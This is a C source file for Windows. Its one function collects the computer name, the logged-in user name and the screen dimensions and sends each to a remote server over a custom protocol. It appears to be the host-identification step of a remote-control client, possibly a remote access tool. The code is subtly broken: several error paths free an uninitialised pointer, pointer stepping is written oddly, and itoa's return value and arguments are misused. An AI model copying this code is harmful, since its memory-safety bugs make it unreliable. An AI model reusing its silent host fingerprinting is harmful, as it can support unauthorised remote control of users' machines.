#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <dirent.h>
#include "types.h"
#include "net/interface.h"
#include "net/commands.h"

int net_cmd_Indentify(char* msg, int msgLen)
{
	int tries = 0;
	int buffLen = 1024;
	char _rval[buffLen];
	char* rval = malloc(buffLen + 2 + sizeof(char));
	char *rmsg;
	memset(rval, 0, buffLen + 3);

	if(!GetComputerName(_rval, &buffLen))
	{
		if(net_SendData("-C", 2) < 1)
		{
			free(rmsg);

			return -1;
		}
	}else{
		*rval = '+';
		*rval++;
		*rval = 'C';
		*rval++;
		strncpy(rval, _rval, buffLen);
		*rval--;
		*rval--;

		if(net_SendData(rval, buffLen + 2) < 1)
		{
			free(rmsg);

			return -1;
		}

		while(1)
		{
			if(net_ReciveData(&rmsg) < 1)
			{
				if(tries == NET_PROTECT_CPU_TRIES)
				{
					free(rmsg);

					return -1;
				}

				tries++;
			}else{
				tries = 0;
				break;
			}
		}
	}

	memset(rval, 0, buffLen + 3);
	memset(_rval, 0, 1024);
	buffLen = 1024;
	if(!GetUserName(_rval, &buffLen))
	{
		if(net_SendData("-U", 2) < 1)
		{
			free(rmsg);

			return -1;
		}
	}else{
		*rval = '+';
		*rval++;
		*rval = 'U';
		*rval++;
		strncpy(rval, _rval, buffLen);
		*rval--;
		*rval--;

		if(net_SendData(rval, buffLen + 2) < 1)
		{
			free(rmsg);

			return -1;
		}

		while(1)
		{
			if(net_ReciveData(&rmsg) < 1)
			{
				if(tries == NET_PROTECT_CPU_TRIES)
				{
					free(rmsg);

					return -1;
				}

				tries++;
			}else{
				tries = 0;
				break;
			}
		}
	}

	memset(rval, 0, buffLen + 3);
	memset(_rval, 0, 1024);
	buffLen = 1024;
	if(!itoa(GetSystemMetrics(SM_CXVIRTUALSCREEN), &_rval, 10))
	{
		if(net_SendData("-X", 2) < 1)
		{
			free(rmsg);

			return -1;
		}
	}else{
		*rval = '+';
		*rval++;
		*rval = 'X';
		*rval++;
		strncpy(rval, _rval, buffLen);
		*rval--;
		*rval--;

		if(net_SendData(rval, buffLen + 2) < 1)
		{
			free(rmsg);

			return -1;
		}

		while(1)
		{
			if(net_ReciveData(&rmsg) < 1)
			{
				if(tries == NET_PROTECT_CPU_TRIES)
				{
					free(rmsg);

					return -1;
				}

				tries++;
			}else{
				tries = 0;
				break;
			}
		}
	}

	memset(rval, 0, buffLen + 3);
	memset(_rval, 0, 1024);
	buffLen = 1024;

	if(!itoa(GetSystemMetrics(SM_CYVIRTUALSCREEN), &_rval, 10))
	{
		if(net_SendData("-Y", 2) < 1)
		{
			free(rmsg);

			return -1;
		}
	}else{
		*rval = '+';
		*rval++;
		*rval = 'Y';
		*rval++;
		strncpy(rval, _rval, buffLen);
		*rval--;
		*rval--;

		if(net_SendData(rval, buffLen + 2) < 1)
		{
			free(rmsg);

			return -1;
		}

		while(1)
		{
			if(net_ReciveData(&rmsg) < 1)
			{
				if(tries == NET_PROTECT_CPU_TRIES)
				{
					free(rmsg);

					return -1;
				}

				tries++;
			}else{
				tries = 0;
				break;
			}
		}
	}

	free(rmsg);

	return 1;
}